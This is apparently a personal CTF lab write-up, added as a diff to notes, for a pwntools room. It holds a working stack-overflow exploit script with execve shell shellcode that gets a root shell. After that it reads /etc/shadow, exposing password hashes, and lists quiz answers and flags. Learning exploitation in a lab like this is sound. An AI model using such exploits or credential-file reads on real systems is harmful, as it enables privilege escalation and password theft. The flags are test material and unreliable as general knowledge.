@@ -1018,3 +1018,514 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat shellcraft.py
 from pwn import *
 
 padding = cyclic(cyclic_find('taaa'))
+
+eip = p32(0xffffd510+200)
+nop_slide = "\x90"*1000
+shellcode = "\xcc"
+payload = padding + eip + nop_slide + shellcode
+print(payload)
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ python shellcraft.py 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa��\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90�
+
+uzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ ./intro2pwnFinal < attack
+Hello There. Do you have an input for me?
+Trace/breakpoint trap (core dumped)
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ shellcraft i386.linux.sh
+6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ shellcraft i386.linux.sh -f a
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+This is shellcode for spawning a shell on a 32-bit Linux system.
+
+The code is written in assembly and is meant to be used with the Pwntools library, which is a Python library for exploit development.
+
+The shellcode starts by pushing the string "/bin///sh" onto the stack in reverse order, since x86 processors are little-endian. It then moves the address of the string into the EBX register.
+
+Next, it creates an array with a single element, the string "sh". It does this by pushing the integer value 0x1010101 onto the stack, XORing the top dword of the stack with 0x1016972, pushing a null byte onto the stack, and finally pushing the value 4 onto the stack, which will be used as the argument count for the execve() system call.
+
+The code then sets the ECX register to point to the "sh" string in the argument array.
+
+It sets the EDX register to zero, indicating that there are no environment variables to pass to the new process.
+
+Finally, the code pushes the value 0xb (the system call number for execve()) onto the stack, loads it into the EAX register, and makes the system call with int 0x80. This will spawn a shell with the current process's privileges.
+
+`execve` is a system call in Linux and other Unix-like operating systems that is used to execute a new program. When a program calls `execve`, it replaces the current process with a new process that is loaded from a specified executable file.
+
+`execve` takes three arguments: the path to the executable file, an array of command line arguments for the new process, and an array of environment variables for the new process.
+
+The new program that is loaded will have the same process ID and file descriptor table as the old program, but it will have its own memory space, registers, and instruction pointer. This means that any changes made to the new process will not affect the old process, and vice versa.
+
+In simpler terms, `execve` is a system call that is used to run a new program. It replaces the current program with the new program and allows the new program to run with its own arguments and environment variables.
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
+    /* execve(path='/bin///sh', argv=['sh', '-p'], envp=0) */
+    /* push '/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00', '-p\x00'] */
+    /* push 'sh\x00-p\x00\x00' */
+    push 0x70
+    push 0x1010101
+    xor dword ptr [esp], 0x2c016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 7
+    pop ecx
+    add ecx, esp
+    push ecx /* '-p\x00' */
+    push 8
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+raft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
+"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ nano shellcraft.py 
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat shellcraft.py 
+from pwn import *
+
+proc = process('./intro2pwnFinal')
+
+proc.recvline()
+
+padding = cyclic(cyclic_find('taaa'))
+
+eip = p32(0xffffd510+200)
+
+nop_slide = "\x90"*1000
+
+shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+
+payload = padding + eip + nop_slide + shellcode
+
+proc.send(payload)
+
+proc.interactive()
+
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ python shellcraft.py 
+[+] Starting local process './intro2pwnFinal': pid 3047
+[*] Switching to interactive mode
+```
+```text
+$ ls
+```
+```text
+$ ls
+attack         intro2pwnFinal      pattern        test_shellcraft.c
+disable_aslr.sh  note_to_buzz_2.txt  shellcraft.py
+```
+```text
+$ whoami
+root
+```
+```text
+$ cd /root
+```
+```text
+$ ls
+flag.txt
+```
+```text
+$ cat flag.txt
+flag{pwn!ng_!$_fr33d0m}
+```
+```text
+$ ls -lah
+total 32K
+drwx------  4 root root 4.0K Jun 10  2021 .
+drwxr-xr-x 26 root root 4.0K Jun  9  2021 ..
+-rw-------  1 root root   28 May 19  2021 .bash_history
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwxr-xr-x  3 root root 4.0K Jun  9  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4.0K May 19  2021 .ssh
+-rw-rw-r--  1 root buzz   24 Jun 10  2021 flag.txt
+```
+```text
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+dizmas:x:1000:1000:dizmas:/home/dizmas:/bin/bash
+buzz:x:1001:1001:,,,:/home/buzz:/bin/bash
+```
+```text
+$ cat /etc/shadow
+root:*:18480:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18766:0:99999:7:::
+dizmas:$6$tugkwjz3JpOOBV2p$6b6ohAph0/MkYKGvGq4LLBv64f1Y7ujG02MwTj/n5tsyVIR2BkJaiHfLdDe4uEDe2obSsTB/irBF910UO5v0a0:18766:0:99999:7:::
+buzz:$6$odYhpabo$CJRocNlIiJRtuk/Vx3beVpZFrym/GfNSEKvmYnpk53NJFcNkvIL9BziWj9hoM4KPW0oROvVaPSTEkB3Xwi/pA.:18766:0:99999:7:::
+
+:)
+
+Was really fun!
+```
+What does ASLR stand for?
+*address space layout randomization*
+Who owns intro2pwnFinal?
+*root*
+Use checksec on intro2pwn final. Is NX enabled? (Y or N)
+If NX in enabled, then writable areas of memory (like the stack) are not executable. This means our shellcode would not execute.
+*N*
+Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?
+What is 0x61616174 is ascii?
+*taaa*
+Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output_file). What does it say when you hit the breakpoint?
+In gdb, it will say "Program received signal SIGTRAP, Trace/breakpoint trap."
+*Trace/breakpoint trap*
+Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path='/bin///sh', argv=['sh'], envp=0)." What function is it using?
+It is in the exec() family of functions.
+*execve*
+Run whoami once you have the shell. Who are you?
+*root*
+What is the flag?
+### Conclusion
+I hope you have enjoyed our adventure through binary exploitation and pwntools! There's not much else to do on our box, unless you're a strange person who likes to snoop in other people's home directories.
+**Final Words:**
+I want to emphasize that I am not an expert in software exploitation (or any other type of hacking). I'm just a student and enthusiast, and I wanted to share something that I enjoyed with the rest of y'all. This room scratched the surface of both binary exploitation in general and pwntools in particular, and there is a lot more out there to explore. Some resources that I have found helpful would be:
+[Live Overflow's Binary Exploit Playlist on YouTube](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) (this is where I first learned this stuff!)
+[Exploit Education website](https://exploit.education/) (Credit goes here, because the challenges for today were partially inspired by these exercises)
+[Nightmare course on GitHub](https://github.com/guyinatuxedo/nightmare/tree/master/modules) (a huge collection of challenges from old CTFs)
+Also, I have learned a lot from the talented CTF players that I have met in my short time with the community.  I had a great time developing this room, and I hope you had a great time solving it. I may have more content to develop in the future. For now, it's been a pleasure, goodbye!
+Sincerely,
+DiZma$
+Answer the questions below
+```text
+$ cd dizmas
+```
+
+## Privilege Escalation
+```text
+$ ls -lah
+total 72K
+drwxrwx--- 5 dizmas dizmas 4.0K Jun  9  2021 .
+drwxr-xr-x 4 root   root   4.0K May 19  2021 ..
+-rw------- 1 dizmas dizmas 2.1K Jun 10  2021 .bash_history
+-rw-r--r-- 1 dizmas dizmas  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 dizmas dizmas 3.7K Apr  4  2018 .bashrc
+drwx------ 3 dizmas dizmas 4.0K Jun  9  2021 .cache
+-rw-r--r-- 1 root   root     36 Jun  9  2021 .gdbinit
+drwx------ 3 dizmas dizmas 4.0K May 19  2021 .gnupg
+drwxrwxr-x 3 dizmas dizmas 4.0K Jun  9  2021 .local
+-rw-r--r-- 1 dizmas dizmas  807 Apr  4  2018 .profile
+-rw-rw-r-- 1 dizmas dizmas   66 Jun  9  2021 .selected_editor
+-rw-r--r-- 1 dizmas dizmas    0 May 19  2021 .sudo_as_admin_successful
+-rw------- 1 dizmas dizmas 9.4K Jun  9  2021 .viminfo
+-rw-rw-r-- 1 dizmas dizmas   85 Jun  9  2021 note_to_root.txt
+-rwxrwxr-x 1 dizmas dizmas 7.6K Jun  9  2021 serve_flag
+-rw-rw-r-- 1 dizmas dizmas 2.4K Jun  9  2021 test_network.c
+```
+```text
+$ cat note_to_root.txt
+
+Hi Friend,
+You already won, why are
+you snooping around my
+home directory?
+
+DiZma$
+```
+```text
+$ cat .bash_history
+whoami
+clear
+ls
+clear
+ls
+pwd
+cd ..
+ls
+cd ~
+ls
+clear
+sudo su
+clear
+ls
+vim start_server.c 
+gcc start_server.c 
+clear
+ls
+./a.out 
+vim start_server.c 
+gcc start_server.c 
+clear
+ls
+./a.out 
+vim start_server.c 
+clear
+gcc start_server.c 
+ls
+./a.out 
+clear
+ls
+cp a.out /home/buzz/IntroToPwntools/IntroToPwntools/networking/restart_1337
+sudo cp a.out /home/buzz/IntroToPwntools/IntroToPwntools/networking/restart_1337
+clear
+ls
+clear
+ls
+rm start
+ls
+clear
+ls
+cat start_server.c 
+uname -a
+system
+clear
+ls
+crontab -e
+clear
+ls
+crontab -e
+clear
+ls
+nc 127.0.0.1 1337
+clear
+ls
+nc 127.0.0.1 1337
+cat /etc/crontab 
+clear
+ls
+crontab -e
+clear
+ls
+rm a.out 
+clear
+ls
+cd /home/buzz/
+cd IntroToPwntools/
+ls
+cd IntroToPwntools/
+ls
+cd networking/
+ls
+clear
+ls
+rm restart_1337 
+sudo rm restart_1337 
+clear
+ls
+cat note_to_buzz.txt 
+nc 127.0.0.1 1337
+clear
+ls
+cat note_to_buzz.txt 
+python pwnnetwork.py 
+clear
+ls
+cd ..
+ls
+clear
+ls
+cd shellcraft/
+ls
+cd ..
+ls
+cd ~
+cd ..
+ls
+cd dizmas/
+clear
+ls
+cat start_server.c 
+rm start_server.c 
+clear
+ls
+nano note_to_root.txt
+clear
+ls
+cat note_to_root.txt 
+ls
+clear
+ls
+cd /home/
+cd buzz/IntroToPwntools/
+cd IntroToPwntools/
+ls
+clear
+ls
+cd shellcraft/
+ls
+clear
+ls
+cat note_to_buzz_2.txt 
+cat disable_aslr.sh 
+ls
+clear
+ls
+ls -l
+sudo chown root:root intro2pwnFinal 
+ls
+ls -l
+clear
+sudo chmod +x intro2pwnFinal 
+clear
+ls
+./intro2pwnFinal 
+clear
+ls
+cat note_to_buzz_2.txt 
+ls
+cat test_shellcraft.c 
+vim test_shellcraft.c 
+clear
+ls
+ls -l
+sudo vim test_shellcraft.c 
+clear
+ls
+./intro2pwnFinal 
+clear
+ls
+cat test_shellcraft.c 
+clear
+ls
+ls -l
+sudo u+s intro2pwnFinal 
+sudo chmod u+s intro2pwnFinal 
+clear
+ls
+ls -l
+visudo
+sudo visudo
+clear
+sudo deluser buzz sudo
+whoami
+ls
+cat note_to_root.txt 
+clear
+ls
+cd /home/buzz/IntroToPwntools/IntroToPwntools/
+ls
+cd shellcraft/
+ls
+sudo chown dizmas:dizmas note_to_buzz_2.txt 
+clear
+ls
+clear
+ls
+cat note_to_buzz_2.txt 
+ls -l
+sudo chown dizmas:dizmas disable_aslr.sh 
+ls
+ls -l
+clear
+ls
+cd ..
+ls
+cd networking/
+ls
+sudo chown dizmas:dizmas note_to_buzz.txt 
+ls
+ls -l
+clear
+ls
+ls -l
+ls
+clear
+ls
+nc 127.0.0.1 1337
+clear
+ls
+```
+```text
+$ cat disable_aslr.sh
+echo 0 | tee /proc/sys/kernel/randomize_va_space
+```
+I have learned the basics of pwntools, and I am now a 1337 h4x0r!
+Completed
+
+## Flags / Answers
+- ***flag{13@rning_2_pwn!}***
+- ***flag{n3tw0rk!ng_!$_fun}***
+- ***flag{pwn!ng_!$_fr33d0m}***
+
+## Notes / Lessons Learned
+[[Introduction to Flask]]
+
